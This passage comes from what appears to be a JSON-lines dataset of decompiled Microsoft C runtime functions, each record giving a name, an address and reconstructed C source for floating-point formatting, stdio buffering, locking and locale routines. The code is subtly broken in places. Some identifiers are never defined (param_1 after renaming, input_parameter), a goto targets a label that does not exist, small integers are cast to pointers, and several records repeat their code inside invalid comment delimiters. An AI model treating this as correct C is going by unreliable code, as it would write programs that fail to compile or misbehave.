(uint)!param_7 + param_3;\n        \n        eVar2 = _strcpy_s(pcVar5, (rsize_t)(param_2 != 0xffffffff ? param_1 + (param_2 - (int)pcVar5) : (char *)0xffffffff), \"e+000\");\n        \n        \n        if (eVar2 != 0) {\n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n        }\n        \n        if (param_4) {\n            *pcVar5 = 'E';\n        }\n        \n        if (**(char **)(param_6 + 8) != '0') {\n            iVar4 = *(int *)(param_6 + 4) - 1; \n            if (iVar4 < 0) {\n                iVar4 = -iVar4; \n                pcVar5[1] = '-'; \n            }\n            \n            if (99 < iVar4) {\n                pcVar5[2] += (char)(iVar4 / 100); \n                iVar4 %= 100; \n            }\n            if (9 < iVar4) {\n                pcVar5[3] += (char)(iVar4 / 10); \n                iVar4 %= 10; \n            }\n            pcVar5[4] += (char)iVar4; \n        }\n        \n        if ((param_5 == 2) && (pcVar5[2] == '0')) {\n            FUN_10018bf0((undefined8 *)(pcVar5 + 2), (undefined8 *)(pcVar5 + 3), 3); \n        }\n        iVar4 = 0; \n    } else {\n        undefined4 *puVar1 = (undefined4 *)FUN_100253b8(); \n        iVar4 = 0x22; \n        *puVar1 = 0x22; \n        FUN_1001de96(); \n    }\n    return iVar4; \n}"}
{"Function Name": "fp_format_f", "Address": "10029a45", "Source Code": "int __cdecl\nfp_format_f(double *param_1, char *param_2, uint param_3, char *param_4, uint param_5, int param_6,\n__crt_locale_pointers *param_7)\n{\n    int iVar1; \n    uint uVar2; \n    \n    uVar2 = (param_3 != 0xffffffff) ? param_3 - (*(int *)param_1 == 0x2d) : 0xffffffff;\n    \n    iVar1 = ___acrt_fp_strflt_to_string((undefined8 *)(param_2 + (*(int *)param_1 == 0x2d)), uVar2, param_6, (int *)param_1);\n    \n    if (iVar1 == 0) {\n        \n        iVar1 = fp_format_f_internal(param_2, param_3, param_6, (_strflt *)param_1, false, param_7);\n    }\n    else {\n        \n        *param_2 = '\\0';\n    }\n    \n    return iVar1;\n}"}
{"Function Name": "fp_format_g", "Address": "10029ba9", "Source Code": "int __cdecl\nfp_format_g(double *param_1, char *param_2, uint param_3, char *param_4, uint param_5, int param_6,\nbool param_7, uint param_8, __crt_locale_pointers *param_9)\n{\n    uint uVar2; \n    int iVar3;  \n    undefined8 *puVar1; \n    undefined8 *puVar4; \n    bool bVar5; \n    int local_14 = 0; \n    \n    FUN_10032004(*(uint *)param_1, *(uint *)((int)param_1 + 4), param_6, &local_14, param_4, param_5);\n    \n    \n    bVar5 = local_14 == 0x2d;\n    \n    \n    uVar2 = (param_3 != 0xffffffff) ? param_3 - bVar5 : 0xffffffff;\n    \n    iVar3 = ___acrt_fp_strflt_to_string((undefined8 *)(param_2 + bVar5), uVar2, param_6, (int *)&local_14);\n    \n    \n    if (iVar3 == 0) {\n        iVar3 = param_6 - 1; \n        \n        \n        if ((iVar3 < -4) || (param_6 <= iVar3)) {\n            \n            iVar3 = fp_format_e_internal(param_2, param_3, param_6, param_7, param_8, (_strflt *)&local_14, true, param_9);\n        } else {\n            puVar1 = (undefined8 *)(param_2 + bVar5); \n            \n            \n            if (param_6 - 1 < iVar3) {\n                do {\n                    puVar4 = puVar1; \n                    puVar1 = (undefined8 *)((int)puVar4 + 1); \n                } while (*(char *)puVar4 != '\\0'); \n                \n                *(undefined *)((int)puVar4 + -1) = 0; \n            }\n            \n            iVar3 = fp_format_f_internal(param_2, param_3, param_6, (_strflt *)&local_14, true, param_9);\n        }\n    } else {\n        *param_2 = '\\0'; \n    }\n    \n    return iVar3; \n}"}
{"Function Name": "fp_format_nan_or_infinity", "Address": "10029c71", "Source Code": "int __cdecl\nfp_format_nan_or_infinity\n(__acrt_fp_class param_1, bool param_2, char *param_3, uint param_4, bool param_5)\n{\n    char *pcVar1; \n    char cVar2; \n    int iVar3; \n    errno_t eVar4; \n    uint uVar5; \n    char *pcVar6; \n    uint local_8; \n    \n    local_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\n    \n    if (param_4 < param_2 + 4) {\n        *param_3 = '\\0'; \n    }\n    else {\n        \n        if (param_2) {\n            *param_3++ = '-'; \n            param_4--; \n        }\n        \n        char *local_48[4] = {\"INF\", &DAT_1003f73c, &DAT_1003f740, &DAT_1003f740};\n        uVar5 = param_5 - 1 & 2; \n        pcVar6 = local_48[param_1 * 4 + -4 + uVar5]; \n        pcVar1 = pcVar6 + 1; \n        \n        do {\n            cVar2 = *pcVar6++; \n        } while (cVar2 != '\\0'); \n        \n        eVar4 = _strcpy_s(param_3, param_4,\n            local_48[((param_1 * 4 + -3) - (uint)((uint)((int)pcVar6 - (int)pcVar1) < param_4)) + uVar5]);\n        \n        if (eVar4 != 0) {\n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n        }\n    }\n    \n    iVar3 = ___security_check_cookie_4(local_8 ^ (uint)&stack0xfffffffc);\n    return iVar3; \n}"}
{"Function Name": "shift_bytes", "Address": "10029d69", "Source Code": "void __cdecl shift_bytes(char *input_buffer, uint shift_amount, char *output_buffer, int shift_positions)\n{\n    \n    if (shift_positions != 0) {\n        char *current_char_pointer = output_buffer; \n        \n        while (*current_char_pointer != '\\0') {\n            current_char_pointer++; \n        }\n        \n        FUN_10018bf0((undefined8 *)(output_buffer + shift_positions), (undefined8 *)output_buffer, (uint)(current_char_pointer + 1));\n    }\n}"}
{"Function Name": "___acrt_fp_format", "Address": "10029d9d", "Source Code": "int __cdecl\n___acrt_fp_format(double *param_1, undefined (*param_2)[16], uint param_3, char *param_4, uint param_5,\nint param_6, size_t param_7, uint param_8, undefined4 param_9, __acrt_ptd **param_10)\n{\n    undefined4 *puVar2; \n    __acrt_fp_class _Var3; \n    int iVar4; \n    uint uVar5; \n    bool local_8 = false; \n    \n    if (param_2 == (undefined (*)[16])0x0 || param_3 == 0 || param_4 == (char *)0x0 || param_5 == 0) {\n        puVar2 = (undefined4 *)FUN_100253b8(); \n        *puVar2 = 0x16; \n        return 0x16; \n    }\n    \n    if (param_6 == 0x41 || param_6 == 0x45 || param_6 == 0x46 || param_6 == 0x47) {\n        local_8 = true; \n    }\n    \n    if ((param_8 & 8) == 0 && (_Var3 = FUN_100294c5((uint *)param_1), _Var3 != 0)) {\n        bool bVar1 = __acrt_fp_is_negative(param_1); \n        return fp_format_nan_or_infinity(_Var3, bVar1, (char *)param_2, param_3, local_8); \n    }\n    \n    uVar5 = (param_8 & 0x10) == 0 ? 2 : 3; \n    \n    if (param_6 < 0x62) {\n        \n        if (param_6 == 0x61 || param_6 == 0x41) {\n            return FUN_1002954b(param_1, param_2, param_3, param_4, param_5, param_7, local_8, uVar5, param_10); \n        }\n        iVar4 = param_6 - 0x45; \n    } else {\n        iVar4 = param_6 - 0x65; \n    }\n    \n    if (iVar4 == 0) {\n        return fp_format_e(param_1, (char *)param_2, param_3, param_4, param_5, param_7, local_8, uVar5, (__crt_locale_pointers *)param_10); \n    } else if (iVar4 == 1) {\n        return fp_format_f(param_1, (char *)param_2, param_3, param_4, param_5, param_7, (__crt_locale_pointers *)param_10); \n    } else {\n        return fp_format_g(param_1, (char *)param_2, param_3, param_4, param_5, param_7, local_8, uVar5, (__crt_locale_pointers *)param_10); \n    }\n}"}
{"Function Name": "__fileno", "Address": "10029ee7", "Source Code": "int __cdecl __fileno(FILE *filePointer)\n{\n    \n    if (filePointer == (FILE *)0x0) {\n        \n        *(undefined4 *)getErrorLocation() = 0x16;\n        \n        handleError();\n        \n        return -1;\n    }\n    \n    return filePointer->_file;\n}"}
{"Function Name": "___acrt_stdio_begin_temporary_buffering_nolock", "Address": "10029f22", "Source Code": "uint __cdecl ___acrt_stdio_begin_temporary_buffering_nolock(FILE *file_pointer)\n{\n    int isatty_check_result; \n    FILE *standard_file_pointer; \n    char *buffer_pointer; \n    char **buffer_pointer_pointer; \n    isatty_check_result = __isatty(__fileno(file_pointer)); \n    if (isatty_check_result == 0) { \n        return 0; \n    }\n    standard_file_pointer = (FILE *)___acrt_iob_func(1); \n    if (file_pointer == standard_file_pointer) { \n        buffer_pointer_pointer = (char **)&DAT_10050074; \n    } else {\n        standard_file_pointer = (FILE *)___acrt_iob_func(2); \n        if (file_pointer != standard_file_pointer) { \n            return (uint)standard_file_pointer & 0xffffff00; \n        }\n        buffer_pointer_pointer = (char **)&DAT_10050078; \n    }\n    _DAT_1005006c++; \n    if (((uint)*buffer_pointer_pointer & 0x4c0) != 0) { \n        return (uint)*buffer_pointer_pointer & 0xffffff00; \n    }\n    LOCK(); \n    file_pointer->_flag |= 0x282; \n    UNLOCK(); \n    buffer_pointer = *buffer_pointer_pointer; \n    if (buffer_pointer == (char *)0x0) { \n        buffer_pointer = (char *)__malloc_base(0x1000); \n        *buffer_pointer_pointer = buffer_pointer; \n        FID_conflict__free((void *)0x0); \n        if (buffer_pointer == (char *)0x0) { \n            file_pointer->_base = (char *)0x2; \n            file_pointer->_cnt = (int)&file_pointer->_charbuf; \n            file_pointer->_ptr = (char *)&file_pointer->_charbuf; \n            file_pointer->_bufsiz = 2; \n            return 0; \n        }\n    }\n    file_pointer->_cnt = (int)buffer_pointer; \n    file_pointer->_ptr = buffer_pointer; \n    file_pointer->_base = (char *)0x1000; \n    file_pointer->_bufsiz = 0x1000; \n    return CONCAT31((int3)((uint)buffer_pointer >> 8), 1); \n}"}
{"Function Name": "___acrt_stdio_end_temporary_buffering_nolock", "Address": "10029fd7", "Source Code": "void __cdecl ___acrt_stdio_end_temporary_buffering_nolock(char is_buffering_enabled, FILE *file_stream)\n{\n    \n    if ((is_buffering_enabled != '\\0') && ((file_stream->_flag >> 9 & 1) != 0)) {\n        \n        ___acrt_stdio_flush_nolock(file_stream);\n        \n        \n        LOCK();\n        \n        \n        file_stream->_flag &= 0xfffffd7f;\n        \n        \n        UNLOCK();\n        \n        \n        file_stream->_bufsiz = 0;\n        \n        \n        file_stream->_cnt = 0;\n        \n        \n        file_stream->_ptr = (char *)0x0;\n    }\n    \n    return;\n}"}
{"Function Name": "operator()<>", "Address": "1002a010", "Source Code": "\\*\nvoid operator()<>(int *resource_lock,<lambda_e378711a6f6581bf7f0efd7cdf97f5d9> *lambda_object)\n{\n    \n    ___acrt_lock(*param_1);\n    \n    \n    <lambda_e378711a6f6581bf7f0efd7cdf97f5d9>::operator()(lambda_object);\n    \n    \n    FUN_1002a047();\n}\n*\\ \n \nvoid operator()<>(int *resource_lock,<lambda_e378711a6f6581bf7f0efd7cdf97f5d9> *lambda_object)\n{\n    ___acrt_lock(*param_1);\n    <lambda_e378711a6f6581bf7f0efd7cdf97f5d9>::operator()(lambda_object);\n    FUN_1002a047();\n}"}
{"Function Name": "__acrt_lock_and_call<>", "Address": "1002a0d7", "Source Code": "\\*\nvoid __cdecl __acrt_lock_and_call<>(int param_1)\n{\n    \n    FUN_1002a08e(&input_parameter);\n    \n    \n    return;\n}\n*\\ \n \nvoid __cdecl __acrt_lock_and_call<>(int param_1)\n{\n    FUN_1002a08e(&input_parameter);\n    return;\n}"}
{"Function Name": "__acrt_lock_and_call<class_<lambda_e378711a6f6581bf7f0efd7cdf97f5d9>_>", "Address": "1002a0ff", "Source Code": "\\*\nvoid __cdecl\n__acrt_lock_and_call<class_<lambda_e378711a6f6581bf7f0efd7cdf97f5d9>_>\n(__acrt_lock_id param_1,<lambda_e378711a6f6581bf7f0efd7cdf97f5d9> *param_2)\n{\n    \n    operator()<>((int *)&param_1,param_2);\n    \n    return;\n}\n*\\ \n \nvoid __cdecl\n__acrt_lock_and_call<class_<lambda_e378711a6f6581bf7f0efd7cdf97f5d9>_>\n(__acrt_lock_id param_1,<lambda_e378711a6f6581bf7f0efd7cdf97f5d9> *param_2)\n{\n    operator()<>((int *)&param_1,param_2);\n    return;\n}"}
{"Function Name": "FUN_1002a127", "Address": "1002a127", "Source Code": "void __fastcall FUN_1002a127(void **elementsArray)\n{\n    \n    void **nextElement = elementsArray + 1;\n    \n    if (elementsArray != nextElement) {\n        \n        do {\n            \n            if ((undefined **)*elementsArray != &PTR_DAT_1004e1f0) {\n                \n                *elementsArray = __updatetlocinfoEx_nolock(elementsArray, &PTR_DAT_1004e1f0);\n            }\n            \n            elementsArray++;\n        } while (elementsArray != nextElement); \n    }\n}"}
{"Function Name": "___acrt_copy_locale_name", "Address": "1002a2b0", "Source Code": "\\*\nwchar_t * __cdecl ___acrt_copy_locale_name(wchar_t *locale_name_input)\n{\n    uint locale_name_length; \n    wchar_t *copied_locale_name; \n    \n    if (locale_name_input == (wchar_t *)0x0) {\n        return (wchar_t *)0x0; \n    }\n    \n    \n    locale_name_length = FUN_10028860(locale_name_input, 0x55);\n    \n    \n    if (locale_name_length < 0x55) {\n        \n        copied_locale_name = (wchar_t *)__malloc_base(locale_name_length * 2 + 2);\n        \n        \n        if (copied_locale_name != (wchar_t *)0x0 && FUN_10025329(copied_locale_name, locale_name_length + 1, locale_name_input, locale_name_length + 1) != 0) {\n            \n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n        }\n    } else {\n        \n        copied_locale_name = (wchar_t *)0x0;\n    }\n    \n    \n    return copied_locale_name;\n}\n*\\ \n \nwchar_t * __cdecl ___acrt_copy_locale_name(wchar_t *locale_name_input)\n{\n    uint locale_name_length;\n    wchar_t *copied_locale_name;\n    if (locale_name_input == (wchar_t *)0x0) {\n        return (wchar_t *)0x0;\n    }\n    \n    locale_name_length = FUN_10028860(locale_name_input, 0x55);\n    if (locale_name_length < 0x55) {\n        copied_locale_name = (wchar_t *)__malloc_base(locale_name_length * 2 + 2);\n        if (copied_locale_name != (wchar_t *)0x0 && FUN_10025329(copied_locale_name, locale_name_length + 1, locale_name_input, locale_name_length + 1) != 0) {\n            __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n        }\n    } else {\n        copied_locale_name = (wchar_t *)0x0;\n    }\n    \n    return copied_locale_name;\n}"}
{"Function Name": "___lc_lctowcs", "Address": "1002a338", "Source Code": "void __cdecl ___lc_lctowcs(wchar_t *destination, rsize_t destination_size, wchar_t *source)\n{\n    \n    if (_wcscpy_s(destination, destination_size, source) == 0) {\n        \n        if (source[0x40] != L'\\0') {\n            \n            __wcscats(destination, destination_size, (wchar_t *)0x2);\n        }\n        \n        if (source[0x80] != L'\\0') {\n            \n            __wcscats(destination, destination_size, (wchar_t *)0x2);\n        }\n        return; \n    }\n    \n    __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n}"}
{"Function Name": "___lc_wcstolc", "Address": "1002a3a8", "Source Code": "undefined4 __cdecl ___lc_wcstolc(wchar_t *input_buffer,wchar_t *input_string)\n{\n    size_t segment_length; \n    wchar_t *destination_pointer; \n    uint max_size; \n    int section_counter = 0; \n    _memset(input_buffer, 0, 0x1ca); \n    if (*input_string == L'\\0') { \n        return 0; \n    }\n    if ((*input_string == L'.') && (input_string[1] != L'\\0')) { \n        if (FUN_10025329(input_buffer + 0x80, 0x10, input_string + 1, 0xf) == 0) { \n            input_buffer[0x8f] = L'\\0'; \n            return 0; \n        }\n    } else {\n        while (true) { \n            segment_length = _wcscspn(input_string, L\"_.,\"); \n            if (segment_length == 0) { \n                return 0xffffffff; \n            }\n            wchar_t next_char = input_string[segment_length]; \n            if (section_counter == 0) { \n                if (segment_length > 0x3f || next_char == L'.') { \n                    return 0xffffffff; \n                }\n                max_size = 0x40; \n                destination_pointer = input_buffer; \n            } else if (section_counter == 1) { \n                if (segment_length > 0x3f || next_char == L'_') { \n                    return 0xffffffff; \n                }\n                max_size = 0x40; \n                destination_pointer = input_buffer + 0x40; \n            } else { \n                if (section_counter != 2 || segment_length > 0xf || (next_char != L'\\0' && next_char != L',')) { \n                    return 0xffffffff; \n                }\n                max_size = 0x10; \n                destination_pointer = input_buffer + 0x80; \n            }\n            if (FUN_10025329(destination_pointer, max_size, input_string, segment_length) != 0) { \n                break; \n            }\n            if (next_char == L',' || next_char == L'\\0') { \n                return 0; \n            }\n            input_string += segment_length + 1; \n            section_counter++; \n        }\n    }\n    __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); \n}"}
{"Function Name": "__copytlocinfo_nolock", "Address": "1002a4d7", "Source Code": "void __cdecl __copytlocinfo_nolock(undefined4 *destination, undefined4 *source)\n{\n    \n    if (source != (undefined4 *)0x0 && destination != (undefined4 *)0x0 && destination != source) {\n        \n        for (int counter = 0x2e; counter != 0; counter--) {\n            *destination++ = *source++; \n        }\n        destination[3] = 0; \n        ___acrt_add_locale_ref((int)destination); \n    }\n}"}
{"Function Name": "__wcscats", "Address": "1002a87d", "Source Code": "void __cdecl __wcscats(wchar_t *destination, rsize_t dest_size, wchar_t *source)\n{\n    errno_t error_code; \n    int index = 0; \n    if (source) { \n        do {\n            \n            error_code = _wcscat_s(destination, dest_size, source[index]);\n            if (error_code != 0) { \n                \n                __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n            }\n            index++; \n        } while (source[index]); \n    }\n}"}
{"Function Name": "__wsetlocale_get_all", "Address": "1002a943", "Source Code": "\\*\nundefined4 * __cdecl __wsetlocale_get_all(int param_1)\n{\n    int referenceCount; // Variable to hold an integer value\n    ushort currentChar; // Variable to hold a ushort value\n    int *intPointer; // Pointer to an integer\n    undefined4 *allocatedMemory; // Pointer to allocated memory\n    undefined4 *resultPointer; // Pointer to undefined4 type\n    errno_t errorCode; // Variable to hold error codes\n    ushort *currentLocaleString; // Pointer to ushort type\n    uint comparisonResult; // Variable to hold unsigned integer value\n    ushort *comparisonLocaleString; // Pointer to another ushort type\n    bool allEqualFlag = true; // Boolean flag initialized to true\n    bool isLessThan; // Boolean flag for comparison\n    ushort **localePointer = (ushort **)(param_1 + 0x30); // Local pointer to ushort pointer\n    undefined **undefinedPointer = &PTR_u_LC_COLLATE_1003f794; // Local pointer to undefined type\n\n    allocatedMemory = (undefined4 *)__malloc_base(0x6a6); // Allocate memory\n    resultPointer = (undefined4 *)0x0; // Initialize pointer to null\n    if (allocatedMemory != (undefined4 *)0x0) { // Check if memory allocation was successful\n        resultPointer = allocatedMemory + 1; // Set pointer to the allocated memory\n        *(undefined2 *)resultPointer = 0; // Initialize memory to zero\n        *allocatedMemory = 1; // Set first element of allocated memory to 1\n        __wcscats((wchar_t *)resultPointer, 0x351, (wchar_t *)0x3); // Concatenate wide strings\n        do {\n            errorCode = _wcscat_s((wchar_t *)resultPointer, 0x351, L\";\"); // Safely concatenate a semicolon\n            if (errorCode != 0) { // Check for errors in concatenation\n                __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0); // Invoke error handling\n            }\n            currentLocaleString = *localePointer; // Get the current locale string\n            comparisonLocaleString = localePointer[4]; // Get the comparison locale string\n            do {\n                currentChar = *currentLocaleString; // Get the current character\n                isLessThan = currentChar < *comparisonLocaleString; // Compare current character with the comparison character\n                if (currentChar != *comparisonLocaleString) { // If characters are not equal\n                    comparisonResult = -(uint)isLessThan | 1; // Determine the result of comparison\n                    goto LAB_1002a9f4; // Jump to label for further processing\n                }\n                if (currentChar == 0) break; // Break if end of string is reached\n                currentChar = currentLocaleString[1]; // Get the next character\n                isLessThan = currentChar < comparisonLocaleString[1]; // Compare next characters\n                if (currentChar != comparisonLocaleString[1]) goto LAB_1002a9ef; // Jump if characters are not equal\n                currentLocaleString += 2; // Move to the next pair of characters\n                comparisonLocaleString += 2; // Move to the next pair of characters\n            } while (currentChar != 0); // Continue until end of string\n            comparisonResult = 0; // Set uVar8 to 0 if all characters are equal\nLAB_1002a9f4:\n            undefinedPointer += 3; // Move to the next locale\n            allEqualFlag = (bool)(allEqualFlag & ~(comparisonResult != 0)); // Update the boolean flag based on comparison result\n            __wcscats((wchar_t *)resultPointer, 0x351, (wchar_t *)0x3); // Concatenate another wide string\n            localePointer += 4; // Move to the next set of locales\n        } while ((int)undefinedPointer < 0x1003f7c4); // Continue until a certain condition is met\n    }\n    if (allEqualFlag) { // If all comparisons were equal\n        FID_conflict__free(allocatedMemory); // Free allocated memory\n        intPointer = *(int **)(param_1 + 0x28); // Get pointer to integer from param_1\n        if (intPointer != (int *)0x0) { // Check if pointer is not null\n            LOCK(); // Acquire lock\n            referenceCount = *intPointer; // Get the current reference count\n            *intPointer = referenceCount - 1; // Decrement reference count\n            UNLOCK(); // Release lock\n            if (referenceCount - 1 == 0) { // If reference count reaches zero\n                FID_conflict__free(*(void **)(param_1 + 0x28)); // Free associated memory\n            }\n        }\n        intPointer = *(int **)(param_1 + 0x24); // Get another pointer to integer\n        if (intPointer != (int *)0x0) { // Check if pointer is not null\n            LOCK(); // Acquire lock\n            referenceCount = *intPointer; // Get the current reference count\n            *intPointer = referenceCount - 1; // Decrement reference count\n            UNLOCK(); // Release lock\n            if (referenceCount == 1) { // If reference count reaches one\n                FID_conflict__free(*(void **)(param_1 + 0x24)); // Free associated memory\n            }\n        }\n        *(undefined4 *)(param_1 + 0x24) = 0; // Reset pointer in param_1\n        *(undefined4 *)(param_1 + 0x1c) = 0; // Reset pointer in param_1\n        *(undefined4 *)(param_1 + 0x28) = 0; // Reset pointer in param_1\n        *(undefined4 *)(param_1 + 0x20) = 0; // Reset pointer in param_1\n        resultPointer = *(undefined4 **)(param_1 + 0x40); // Get pointer from param_1\n    } else { // If there were unequal comparisons\n        intPointer = *(int **)(param_1 + 0x28); // Get pointer to integer from param_1\n        if (intPointer != (int *)0x0) { // Check if pointer is not null\n            LOCK(); // Acquire lock\n            referenceCount = *intPointer; // Get the current reference count\n            *intPointer = referenceCount - 1; // Decrement reference count\n            UNLOCK(); // Release lock\n            if (referenceCount - 1 == 0) { // If reference count reaches zero\n                FID_conflict__free(*(void **)(param_1 + 0x28)); // Free associated memory\n            }\n        }\n        intPointer = *(int **)(param_1 + 0x24); // Get another pointer to integer\n        if (intPointer != (int *)0x0) { // Check if pointer is not null\n            LOCK(); // Acquire lock\n            referenceCount = *intPointer; // Get the current reference count\n            *intPointer = referenceCount - 1; // Decrement reference count\n            UNLOCK(); // Release lock\n            if (referenceCount == 1) { // If reference count reaches one\n                FID_conflict__free(*(void **)(param_1 + 0x24)); // Free associated memory\n            }\n        }\n        *(undefined4 *)(param_1 + 0x24) = 0; // Reset pointer in param_1\n        resultPointer = allocatedMemory + 1; // Set pointer to the allocated memory\n        *(undefined4 *)(param_1 + 0x1c) = 0; // Reset pointer in param_1\n        *(undefined4 **)(param_1 + 0x28) = allocatedMemory; // Set pointer in param_1 to allocated memory\n        *(undefined4 **)(param_1 + 0x20) = resultPointer; // Set pointer in param_1 to the next memory location\n    }\n    return resultPointer; // Return the pointer to the result\n}\n*\\ \n \n\nundefined4 * __cdecl __wsetlocale_get_all(int param_1)\n{\n    int referenceCount;\n    ushort currentChar;\n    int *intPointer;\n    undefined4 *allocatedMemory;\n    undefined4 *resultPointer;\n    errno_t errorCode;\n    ushort *currentLocaleString;\n    uint comparisonResult;\n    ushort *comparisonLocaleString;\n    bool allEqualFlag = true;\n    bool isLessThan;\n    ushort **localePointer = (ushort **)(param_1 + 0x30);\n    undefined **undefinedPointer = &PTR_u_LC_COLLATE_1003f794;\n\n    allocatedMemory = (undefined4 *)__malloc_base(0x6a6);\n    resultPointer = (undefined4 *)0x0;\n    if (allocatedMemory != (undefined4 *)0x0) {\n        resultPointer = allocatedMemory + 1;\n        *(undefined2 *)resultPointer = 0;\n        *allocatedMemory = 1;\n        __wcscats((wchar_t *)resultPointer, 0x351, (wchar_t *)0x3);\n        do {\n            errorCode = _wcscat_s((wchar_t *)resultPointer, 0x351, L\";\");\n            if (errorCode != 0) {\n                __invoke_watson((wchar_t *)0x0, (wchar_t *)0x0, (wchar_t *)0x0, 0, 0);\n            }\n            currentLocaleString = *localePointer;\n            comparisonLocaleString = localePointer[4];\n            do {\n                currentChar = *currentLocaleString;\n                isLessThan = currentChar < *comparisonLocaleString;\n                if (currentChar != *comparisonLocaleString) {\n                    comparisonResult = -(uint)isLessThan | 1;\n                    goto LAB_1002a9f4;\n                }\n                if (currentChar == 0) break;\n                currentChar = currentLocaleString[1];\n                isLessThan = currentChar < comparisonLocaleString[1];\n                if (currentChar != comparisonLocaleString[1]) goto LAB_1002a9ef;\n                currentLocaleString += 2;\n                comparisonLocaleString += 2;\n            } while (currentChar != 0);\n            comparisonResult = 0;\nLAB_1002a9f4:\n            undefinedPointer += 3;\n            allEqualFlag = (bool)(allEqualFlag & ~(comparisonResult != 0));\n            __wcscats((wchar_t *)resultPointer, 0x351, (wchar_t *)0x3);\n            localePointer += 4;\n        } while ((int)undefinedPointer < 0x1003f7c4);\n    }\n    if (allEqualFlag) {\n        FID_conflict__free(allocatedMemory);\n        intPointer = *(int **)(param_1 + 0x28);\n        if (intPointer != (int *)0x0) {\n            LOCK();\n            referenceCount = *intPointer;\n            *intPointer = referenceCount - 1;\n            UNLOCK();\n            if (referenceCount - 1 == 0) {\n                FID_conflict__free(*(void **)(param_1 + 0x28));\n            }\n        }\n        intPointer = *(int **)(param_1 + 0x24);\n        if (intPointer != (int *)0x0) {\n            LOCK();\n            referenceCount = *intPointer;\n            *intPointer = referenceCount - 1;\n            UNLOCK();\n            if (referenceCount == 1) {\n                FID_conflict__free(*(void **)(param_1 + 0x24));\n            }\n        }\n        *(undefined4 *)(param_1 + 0x24) = 0;\n        *(undefined4 *)(param_1 + 0x1c) = 0;\n        *(undefined4 *)(param_1 + 0x28) = 0;\n        *(undefined4 *)(param_1 + 0x20) = 0;\n        resultPointer = *(undefined4 **)(param_1 + 0x40);\n    } else {\n        intPointer = *(int **)(param_1 + 0x28);\n        if (intPointer != (int *)0x0) {\n            LOCK();\n            referenceCount = *intPointer;\n            *intPointer = referenceCount - 1;\n            UNLOCK();\n            if (referenceCount - 1 == 0) {\n                FID_conflict__free(*(void **)(param_1 + 0x28));\n            }\n        }\n        intPointer = *(int **)(param_1 + 0x24);\n        if (intPointer != (int *)0x0) {\n            LOCK();\n            referenceCount = *intPointer;\n            *intPointer = referenceCount - 1;\n            UNLOCK();\n            if (referenceCount == 1) {\n                FID_conflict__free(*(void **)(param_1 + 0x24));\n            }\n        }\n        *(undefined4 *)(param_1 + 0x24) = 0;\n        resultPointer = allocatedMemory + 1;\n        *(undefined4 *)(param_1 + 0x1c) = 0;\n        *(undefined4 **)(param_1 + 0x28) = allocatedMemory;\n        *(undefined4 **)(param_1 + 0x20) = resultPointer;\n    }\n    return resultPointer;\n}\n"}
{"Function Name": "__wsetlocale_set_cat", "Address": "1002adc1", "Source Code": "void __cdecl __wsetlocale_set_cat(int param_1,int param_2,wchar_t *param_3)\n{\nrsize_t _SizeInWords;\nwchar_t wVar1;\nundefined2 *puVar2;\nundefined4 uVar3;\nundefined4 uVar4;\nUINT UVar5;\ncode *pcVar6;\n__acrt_ptd *p_Var7;\nint *piVar8;\nint iVar9;\nuint uVar10;\nundefined4 *_Memory;\nerrno_t eVar11;\nwchar_t *pwVar12;\nint iVar13;\nwchar_t *pwVar14;\nint *piVar15;\n__acrt_ptd **pp_Var16;\nbool bVar17;\nint local_2d0;\nUINT local_2c8;\nint *local_2c4;\n__acrt_ptd **local_2c0;\nwchar_t local_2bc [86];\nWORD local_210 [128];\nwchar_t local_110 [132];\nuint local_8;\nlocal_8 = DAT_1004e008 ^ (uint)&stack0xfffffffc;\np_Var7 = FUN_10029224();\npiVar8 = (int *)(p_Var7 + 0x278);\niVar9 = __expandlocale(param_3,local_110,0x83,local_2bc,0x55,&local_2c8);\nif (iVar9 != 0) {\niVar9 = (param_2 + 2) * 0x10;\npwVar12 = local_110;\npwVar14 = *(wchar_t **)(iVar9 + param_1);\ndo {\nlocal_2c0 = (__acrt_ptd **)0x0;\nbVar17 = (ushort)*pwVar12 < (ushort)*pwVar14;\nif (*pwVar12 != *pwVar14) {\nLAB_1002ae95:\nuVar10 = -(uint)bVar17 | 1;\ngoto LAB_1002ae9a;\n}\nif (*pwVar12 == L'\\0') break;\nwVar1 = pwVar12[1];\nbVar17 = (ushort)wVar1 < (ushort)pwVar14[1];\nlocal_2c4 = (int *)CONCAT22(wVar1,local_2c4._0_2_);\nif (wVar1 != pwVar14[1]) goto LAB_1002ae95;\npwVar12 = pwVar12 + 2;\npwVar14 = pwVar14 + 2;\n} while (wVar1 != L'\\0');\nuVar10 = 0;\nLAB_1002ae9a:\nif (uVar10 != 0) {\npwVar12 = local_110;\ndo {\nwVar1 = *pwVar12;\npwVar12 = pwVar12 + 1;\n} while (wVar1 != L'\\0');\n_SizeInWords = ((int)pwVar12 - (int)(local_110 + 1) >> 1) + 1;\n_Memory = (undefined4 *)__malloc_base(_SizeInWords * 2 + 4);\nif (_Memory != (undefined4 *)0x0) {\npuVar2 = *(undefined2 **)(iVar9 + param_1);\nlocal_2c4 = _Memory + 1;\nuVar3 = *(undefined4 *)(param_1 + 0xa0 + param_2 * 4);\nuVar4 = *(undefined4 *)(param_1 + 8);\neVar11 = _wcscpy_s((wchar_t *)local_2c4,_SizeInWords,local_110);\nif (eVar11 != 0) {\n__invoke_watson((wchar_t *)local_2c0,(wchar_t *)local_2c0,(wchar_t *)local_2c0,\n(uint)local_2c0,(uintptr_t)local_2c0);\n}\n*(int **)(iVar9 + param_1) = local_2c4;\nif ((local_110[0] == L'C') && (local_110[1] == 0)) {\n*(__acrt_ptd ***)(param_1 + 0xa0 + param_2 * 4) = local_2c0;\n}\nelse {\npwVar12 = ___acrt_copy_locale_name(local_2bc);\n*(wchar_t **)(param_1 + 0xa0 + param_2 * 4) = pwVar12;\n}\nif (param_2 == 2) {\n*(UINT *)(param_1 + 8) = 